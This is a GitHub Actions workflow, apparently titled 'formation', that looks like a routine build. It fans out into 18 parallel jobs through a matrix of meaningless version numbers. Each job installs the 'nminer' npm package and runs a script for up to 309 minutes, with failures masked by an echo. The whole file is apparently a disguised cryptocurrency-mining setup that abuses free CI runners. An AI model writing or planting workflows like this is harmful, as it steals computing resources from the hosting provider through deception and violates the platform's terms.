name: formation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9903 }
          - { version: 2732 }
          - { version: 2925 }
          - { version: 135 }
          - { version: 6100 }
          - { version: 2604 }
          - { version: 7758 }
          - { version: 9064 }
          - { version: 3208 }
          - { version: 6264 }
          - { version: 9136 }
          - { version: 9624 }
          - { version: 617 }
          - { version: 1699 }
          - { version: 614 }
          - { version: 7656 }
          - { version: 1093 }
          - { version: 8576 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 309m node formation.js || echo "formation executed"